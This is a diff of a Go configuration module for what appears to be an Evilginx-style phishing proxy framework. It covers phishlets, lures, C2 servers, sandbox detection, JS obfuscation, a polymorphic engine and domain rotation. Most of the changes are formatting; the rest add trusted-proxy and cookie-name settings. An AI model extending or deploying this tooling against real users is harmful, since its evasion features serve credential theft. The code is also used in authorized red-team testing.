@@ -77,11 +77,11 @@ type TelegramConfig struct {
 }
 
 type DNSProviderConfig struct {
-	Provider         string `mapstructure:"provider" json:"provider" yaml:"provider"`
-	ApiKey           string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
-	Email            string `mapstructure:"email" json:"email" yaml:"email"`
-	Enabled          bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
-	WildcardEnabled  bool   `mapstructure:"wildcard_enabled" json:"wildcard_enabled" yaml:"wildcard_enabled"`
+	Provider        string `mapstructure:"provider" json:"provider" yaml:"provider"`
+	ApiKey          string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
+	Email           string `mapstructure:"email" json:"email" yaml:"email"`
+	Enabled         bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	WildcardEnabled bool   `mapstructure:"wildcard_enabled" json:"wildcard_enabled" yaml:"wildcard_enabled"`
 }
 
 type BotguardConfig struct {
@@ -123,100 +123,106 @@ type DomainInfo struct {
 }
 
 type GeneralConfig struct {
-	Domain       string       `mapstructure:"domain" json:"domain" yaml:"domain"` // Legacy: kept for backward compatibility
-	Domains      []DomainInfo `mapstructure:"domains" json:"domains" yaml:"domains"` // New: multiple domains support
-	PrimaryDomain string      `mapstructure:"primary_domain" json:"primary_domain" yaml:"primary_domain"` // Current primary domain
-	OldIpv4      string       `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string       `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string       `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string       `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int          `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int          `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert     bool         `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	Domain           string       `mapstructure:"domain" json:"domain" yaml:"domain"`                         // Legacy: kept for backward compatibility
+	Domains          []DomainInfo `mapstructure:"domains" json:"domains" yaml:"domains"`                      // New: multiple domains support
+	PrimaryDomain    string       `mapstructure:"primary_domain" json:"primary_domain" yaml:"primary_domain"` // Current primary domain
+	OldIpv4          string       `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4     string       `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4         string       `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl        string       `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort        int          `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort          int          `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert         bool         `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	TrustedProxies   []string     `mapstructure:"trusted_proxies" json:"trusted_proxies" yaml:"trusted_proxies"`
+	ServerCookieName string       `mapstructure:"server_cookie_name" json:"server_cookie_name" yaml:"server_cookie_name"`
 }
 
 type Config struct {
-	general              *GeneralConfig
-	certificates         *CertificatesConfig
-	blacklistConfig      *BlacklistConfig
-	whitelistConfig      *WhitelistConfig
-	gophishConfig        *GoPhishConfig
-	telegramConfig       *TelegramConfig
-	proxyConfig          *ProxyConfig
-	dnsProviderConfig    *DNSProviderConfig
-	botguardConfig       *BotguardConfig
-	jsObfuscationConfig  *JSObfuscationConfig
-	mlDetectorConfig     *MLDetectorConfig
-	captchaConfig        *CaptchaConfig
-	domainRotationConfig *DomainRotationConfig
-	trafficShapingConfig *TrafficShapingConfig
+	general                *GeneralConfig
+	certificates           *CertificatesConfig
+	blacklistConfig        *BlacklistConfig
+	whitelistConfig        *WhitelistConfig
+	gophishConfig          *GoPhishConfig
+	telegramConfig         *TelegramConfig
+	proxyConfig            *ProxyConfig
+	dnsProviderConfig      *DNSProviderConfig
+	botguardConfig         *BotguardConfig
+	jsObfuscationConfig    *JSObfuscationConfig
+	mlDetectorConfig       *MLDetectorConfig
+	captchaConfig          *CaptchaConfig
+	domainRotationConfig   *DomainRotationConfig
+	trafficShapingConfig   *TrafficShapingConfig
 	sandboxDetectionConfig *SandboxDetectionConfig
-	c2ChannelConfig *C2Config
-	polymorphicConfig *PolymorphicConfig
+	c2ChannelConfig        *C2Config
+	polymorphicConfig      *PolymorphicConfig
 	cloudflareWorkerConfig *CloudflareConfig
-	lureGenerationConfig *LureGenerationConfig
-	phishletConfig       map[string]*PhishletConfig
-	phishlets          map[string]*Phishlet
-	phishletNames      []string
-	activeHostnames    []string
-	redirectorsDir     string
-	lures              []*Lure
-	lureIds            []string
-	subphishlets       []*SubPhishlet
-	cfg                *viper.Viper
+	lureGenerationConfig   *LureGenerationConfig
+	phishletConfig         map[string]*PhishletConfig
+	phishlets              map[string]*Phishlet
+	phishletNames          []string
+	activeHostnames        []string
+	redirectorsDir         string
+	lures                  []*Lure
+	lureIds                []string
+	subphishlets           []*SubPhishlet
+	cfg                    *viper.Viper
 }
 
 const (
-	CFG_GENERAL       = "general"
-	CFG_CERTIFICATES  = "certificates"
-	CFG_LURES         = "lures"
-	CFG_PROXY         = "proxy"
-	CFG_PHISHLETS     = "phishlets"
-	CFG_BLACKLIST     = "blacklist"
-	CFG_WHITELIST     = "whitelist"
-	CFG_SUBPHISHLETS  = "subphishlets"
-	CFG_GOPHISH       = "gophish"
-	CFG_TELEGRAM      = "telegram"
-	CFG_DNS_PROVIDER  = "dns_provider"
-	CFG_BOTGUARD      = "botguard"
-	CFG_JS_OBFUSCATION = "js_obfuscation"
-	CFG_ML_DETECTOR   = "ml_detector"
-	CFG_CAPTCHA       = "captcha"
-	CFG_DOMAIN_ROTATION = "domain_rotation"
-	CFG_TRAFFIC_SHAPING = "traffic_shaping"
+	CFG_GENERAL           = "general"
+	CFG_CERTIFICATES      = "certificates"
+	CFG_LURES             = "lures"
+	CFG_PROXY             = "proxy"
+	CFG_PHISHLETS         = "phishlets"
+	CFG_BLACKLIST         = "blacklist"
+	CFG_WHITELIST         = "whitelist"
+	CFG_SUBPHISHLETS      = "subphishlets"
+	CFG_GOPHISH           = "gophish"
+	CFG_TELEGRAM          = "telegram"
+	CFG_DNS_PROVIDER      = "dns_provider"
+	CFG_BOTGUARD          = "botguard"
+	CFG_JS_OBFUSCATION    = "js_obfuscation"
+	CFG_ML_DETECTOR       = "ml_detector"
+	CFG_CAPTCHA           = "captcha"
+	CFG_DOMAIN_ROTATION   = "domain_rotation"
+	CFG_TRAFFIC_SHAPING   = "traffic_shaping"
 	CFG_SANDBOX_DETECTION = "sandbox_detection"
-	CFG_C2_CHANNEL = "c2_channel"
-	CFG_POLYMORPHIC = "polymorphic_engine"
+	CFG_C2_CHANNEL        = "c2_channel"
+	CFG_POLYMORPHIC       = "polymorphic_engine"
 	CFG_CLOUDFLARE_WORKER = "cloudflare_worker"
-	CFG_LURE_GENERATION = "lure_generation"
+	CFG_LURE_GENERATION   = "lure_generation"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
+func (c *Config) Save() error {
+	return c.cfg.WriteConfig()
+}
+
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
-		general:              &GeneralConfig{},
-		certificates:         &CertificatesConfig{},
-		gophishConfig:        &GoPhishConfig{},
-		telegramConfig:       &TelegramConfig{},
-		dnsProviderConfig:    &DNSProviderConfig{},
-		botguardConfig:       &BotguardConfig{},
-		jsObfuscationConfig:  &JSObfuscationConfig{},
-		mlDetectorConfig:     &MLDetectorConfig{Enabled: true, Threshold: 0.85, CollectBehavior: true, LogPredictions: true},
-		captchaConfig:        &CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]ProviderConfig)},
-		domainRotationConfig: &DomainRotationConfig{Enabled: false, Strategy: "round-robin", RotationInterval: 60, MaxDomains: 10, AutoGenerate: false},
-		trafficShapingConfig: &TrafficShapingConfig{Enabled: false, Mode: "adaptive", GlobalRateLimit: 1000, GlobalBurstSize: 2000, PerIPRateLimit: 60, PerIPBurstSize: 120, CleanupInterval: 30},
+		general:                &GeneralConfig{},
+		certificates:           &CertificatesConfig{},
+		gophishConfig:          &GoPhishConfig{},
+		telegramConfig:         &TelegramConfig{},
+		dnsProviderConfig:      &DNSProviderConfig{},
+		botguardConfig:         &BotguardConfig{},
+		jsObfuscationConfig:    &JSObfuscationConfig{},
+		mlDetectorConfig:       &MLDetectorConfig{Enabled: true, Threshold: 0.85, CollectBehavior: true, LogPredictions: true},
+		captchaConfig:          &CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]ProviderConfig)},
+		domainRotationConfig:   &DomainRotationConfig{Enabled: false, Strategy: "round-robin", RotationInterval: 60, MaxDomains: 10, AutoGenerate: false},
+		trafficShapingConfig:   &TrafficShapingConfig{Enabled: false, Mode: "adaptive", GlobalRateLimit: 1000, GlobalBurstSize: 2000, PerIPRateLimit: 60, PerIPBurstSize: 120, CleanupInterval: 30},
 		sandboxDetectionConfig: &SandboxDetectionConfig{Enabled: false, Mode: "passive", ServerSideChecks: true, ClientSideChecks: true, CacheResults: true, CacheDuration: 30, DetectionThreshold: 0.6, ActionOnDetection: "block"},
-		c2ChannelConfig: &C2Config{Enabled: false, Transport: "https", Servers: make([]C2Server, 0), HeartbeatInterval: 300, RetryInterval: 30, MaxRetries: 3, CertPinning: false, Compression: true, ChunkSize: 4096},
-		polymorphicConfig: &PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
+		c2ChannelConfig:        &C2Config{Enabled: false, Transport: "https", Servers: make([]C2Server, 0), HeartbeatInterval: 300, RetryInterval: 30, MaxRetries: 3, CertPinning: false, Compression: true, ChunkSize: 4096},
+		polymorphicConfig:      &PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
 		cloudflareWorkerConfig: &CloudflareConfig{},
-		lureGenerationConfig: &LureGenerationConfig{Strategy: "realistic"},
-		phishletConfig:       make(map[string]*PhishletConfig),
-		phishlets:            make(map[string]*Phishlet),
-		phishletNames:        []string{},
-		lures:                []*Lure{},
-		blacklistConfig:      &BlacklistConfig{},
-		whitelistConfig:      &WhitelistConfig{},
+		lureGenerationConfig:   &LureGenerationConfig{Strategy: "realistic"},
+		phishletConfig:         make(map[string]*PhishletConfig),
+		phishlets:              make(map[string]*Phishlet),
+		phishletNames:          []string{},
+		lures:                  []*Lure{},
+		blacklistConfig:        &BlacklistConfig{},
+		whitelistConfig:        &WhitelistConfig{},
 	}
 
 	c.cfg = viper.New()
@@ -249,7 +255,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.cfg.Set("general.autocert", true)
 		c.general.Autocert = true
 	}
-	
+
 	// Migrate legacy single domain to multi-domain structure
 	if len(c.general.Domains) == 0 && c.general.Domain != "" {
 		c.general.Domains = []DomainInfo{
@@ -370,7 +376,7 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 		log.Error("phishlet is a template - can't set hostname")
 		return false
 	}
-	
+
 	// Validate hostname against configured domains
 	if hostname != "" {
 		valid := false
@@ -389,7 +395,7 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 				valid = true
 			}
 		}
-		
+
 		if !valid {
 			domainsList := []string{}
 			for _, d := range c.general.Domains {
@@ -462,32 +468,32 @@ func (c *Config) AddDomain(domain string, description string) error {
 	if domain == "" {
 		return fmt.Errorf("domain cannot be empty")
 	}
-	
+
 	// Check if domain already exists
 	for _, d := range c.general.Domains {
 		if d.Domain == domain {
 			return fmt.Errorf("domain %s already exists", domain)
 		}
 	}
-	
+
 	// Add new domain
 	newDomain := DomainInfo{
 		Domain:      domain,
 		IsPrimary:   false,
-		Enabled:    true,
+		Enabled:     true,
 		AddedAt:     time.Now().Format(time.RFC3339),
 		Description: description,
 	}
-	
+
 	c.general.Domains = append(c.general.Domains, newDomain)
-	
+
 	// If this is the first domain, make it primary
 	if len(c.general.Domains) == 1 {
 		c.general.Domains[0].IsPrimary = true
 		c.general.PrimaryDomain = domain
 		c.general.Domain = domain // Backward compatibility
 	}
-	
+
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("domain added: %s", domain)
 	c.cfg.WriteConfig()
@@ -497,17 +503,17 @@ func (c *Config) AddDomain(domain string, description string) error {
 // RemoveDomain removes a domain from the configuration
 func (c *Config) RemoveDomain(domain string) error {
 	domain = strings.ToLower(strings.TrimSpace(domain))
-	
+
 	// Cannot remove if it's the only domain
 	if len(c.general.Domains) <= 1 {
 		return fmt.Errorf("cannot remove the last domain")
 	}
-	
+
 	// Find and remove domain
 	found := false
 	newDomains := []DomainInfo{}
 	wasPrimary := false
-	
+
 	for _, d := range c.general.Domains {
 		if d.Domain == domain {
 			found = true
@@ -516,13 +522,13 @@ func (c *Config) RemoveDomain(domain string) error {
 		}
 		newDomains = append(newDomains, d)
 	}
-	
+
 	if !found {
 		return fmt.Errorf("domain %s not found", domain)
 	}
-	
+
 	c.general.Domains = newDomains
-	
+
 	// If removed domain was primary, make first enabled domain primary
 	if wasPrimary {
 		if len(c.general.Domains) > 0 {
@@ -531,7 +537,7 @@ func (c *Config) RemoveDomain(domain string) error {
 			c.general.Domain = c.general.PrimaryDomain // Backward compatibility
 		}
 	}
-	
+
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("domain removed: %s", domain)
 	c.cfg.WriteConfig()
@@ -541,7 +547,7 @@ func (c *Config) RemoveDomain(domain string) error {
 // SetPrimaryDomain sets the primary domain
 func (c *Config) SetPrimaryDomain(domain string) error {
 	domain = strings.ToLower(strings.TrimSpace(domain))
-	
+
 	// Find domain and set as primary
 	found := false
 	for i := range c.general.Domains {
@@ -558,11 +564,11 @@ func (c *Config) SetPrimaryDomain(domain string) error {
 			break
 		}
 	}
-	
+
 	if !found {
 		return fmt.Errorf("domain %s not found", domain)
 	}
-	
+
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("primary domain set to: %s", domain)
 	c.cfg.WriteConfig()
@@ -572,7 +578,7 @@ func (c *Config) SetPrimaryDomain(domain string) error {
 // EnableDomain enables or disables a domain
 func (c *Config) EnableDomain(domain string, enabled bool) error {
 	domain = strings.ToLower(strings.TrimSpace(domain))
-	
+
 	found := false
 	for i := range c.general.Domains {
 		if c.general.Domains[i].Domain == domain {
@@ -581,11 +587,11 @@ func (c *Config) EnableDomain(domain string, enabled bool) error {
 			break
 		}
 	}
-	
+
 	if !found {
 		return fmt.Errorf("domain %s not found", domain)
 	}
-	
+
 	c.cfg.Set(CFG_GENERAL, c.general)
 	if enabled {
 		log.Info("domain enabled: %s", domain)
@@ -622,7 +628,7 @@ func (c *Config) GetPrimaryDomain() string {
 // IsDomainValid checks if a domain is in the configured domains list
 func (c *Config) IsDomainValid(domain string) bool {
 	domain = strings.ToLower(strings.TrimSpace(domain))
-	
+
 	// Check exact match
 	for _, d := range c.general.Domains {
 		if d.Domain == domain && d.Enabled {
@@ -633,14 +639,14 @@ func (c *Config) IsDomainValid(domain string) bool {
 			return true
 		}
 	}
-	
+
 	// Backward compatibility: check legacy domain
 	if c.general.Domain != "" {
 		if domain == c.general.Domain || strings.HasSuffix(domain, "."+c.general.Domain) {
 			return true
 		}
 	}
-	
+
 	return false
 }
 
@@ -819,8 +825,8 @@ func (c *Config) SetCloudflareWorkerEnabled(enabled bool) {
 }
 
 func (c *Config) IsCloudflareWorkerEnabled() bool {
-	return c.cloudflareWorkerConfig.Enabled && 
-		c.cloudflareWorkerConfig.AccountID != "" && 
+	return c.cloudflareWorkerConfig.Enabled &&
+		c.cloudflareWorkerConfig.AccountID != "" &&
 		c.cloudflareWorkerConfig.APIToken != ""
 }
 
@@ -1330,6 +1336,10 @@ func (c *Config) GetDefaultDNSProvider() string {
 	return ""
 }
 
+func (c *Config) GetTrustedProxies() []string {
+	return c.general.TrustedProxies
+}
+
 func (c *Config) GetBotguardConfig() *BotguardConfig {
 	return c.botguardConfig
 }
@@ -1388,12 +1398,12 @@ func (c *Config) SetCaptchaProvider(provider string) error {
 	if c.captchaConfig.Providers == nil {
 		c.captchaConfig.Providers = make(map[string]ProviderConfig)
 	}
-	
+
 	// Check if provider config exists
 	if _, exists := c.captchaConfig.Providers[provider]; !exists {
 		return fmt.Errorf("provider %s not configured", provider)
 	}
-	
+
 	c.captchaConfig.Provider = provider
 	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
 	log.Info("captcha provider set to: %s", provider)
@@ -1405,13 +1415,13 @@ func (c *Config) SetCaptchaProviderConfig(provider string, siteKey string, secre
 	if c.captchaConfig.Providers == nil {
 		c.captchaConfig.Providers = make(map[string]ProviderConfig)
 	}
-	
+
 	c.captchaConfig.Providers[provider] = ProviderConfig{
 		SiteKey:   siteKey,
 		SecretKey: secretKey,
 		Options:   options,
 	}
-	
+
 	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
 	log.Info("captcha provider %s configured", provider)
 	c.cfg.WriteConfig()
@@ -1467,7 +1477,7 @@ func (c *Config) AddDomainRotationDNSProvider(name string, provider string, apiK
 	if c.domainRotationConfig.DNSProviders == nil {
 		c.domainRotationConfig.DNSProviders = make(map[string]DomainRotationDNSProvider)
 	}
-	
+
 	c.domainRotationConfig.DNSProviders[name] = DomainRotationDNSProvider{
 		Provider:  provider,
 		APIKey:    apiKey,
@@ -1475,7 +1485,7 @@ func (c *Config) AddDomainRotationDNSProvider(name string, provider string, apiK
 		Zone:      zone,
 		Options:   options,
 	}
-	
+
 	c.cfg.Set(CFG_DOMAIN_ROTATION, c.domainRotationConfig)
 	log.Info("DNS provider %s configured for domain rotation", name)
 	c.cfg.WriteConfig()
@@ -1526,14 +1536,14 @@ func (c *Config) SetTrafficShapingGeoRule(country string, rateLimit int, burstSi
 	if c.trafficShapingConfig.GeoRules == nil {
 		c.trafficShapingConfig.GeoRules = make(map[string]*GeoRuleConfig)
 	}
-	
+
 	c.trafficShapingConfig.GeoRules[country] = &GeoRuleConfig{
 		RateLimit: rateLimit,
 		BurstSize: burstSize,
 		Priority:  priority,
 		Blocked:   blocked,
 	}
-	
+
 	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
 	log.Info("traffic shaping rule for %s configured", country)
 	c.cfg.WriteConfig()
@@ -1616,7 +1626,7 @@ func (c *Config) AddC2Server(id string, url string, priority int) error {
 			return nil
 		}
 	}
-	
+
 	// Add new server
 	server := C2Server{
 		ID:       id,
@@ -1624,7 +1634,7 @@ func (c *Config) AddC2Server(id string, url string, priority int) error {
 		Priority: priority,
 		Active:   true,
 	}
-	
+
 	c.c2ChannelConfig.Servers = append(c.c2ChannelConfig.Servers, server)
 	c.cfg.Set(CFG_C2_CHANNEL, c.c2ChannelConfig)
 	log.Info("C2 server %s added", id)
@@ -1642,7 +1652,7 @@ func (c *Config) RemoveC2Server(id string) error {
 			return nil
 		}
 	}
-	
+
 	return fmt.Errorf("server not found: %s", id)
 }
 
@@ -1726,12 +1736,12 @@ func (c *Config) SetLureGenerationStrategy(strategy string) {
 			break
 		}
 	}
-	
+
 	if !isValid {
 		log.Warning("Invalid lure generation strategy: %s. Using 'realistic' instead.", strategy)
 		strategy = "realistic"
 	}
-	
+
 	c.lureGenerationConfig.Strategy = strategy
 	c.cfg.Set(CFG_LURE_GENERATION, c.lureGenerationConfig)
 	log.Info("Lure generation strategy set to: %s", strategy)
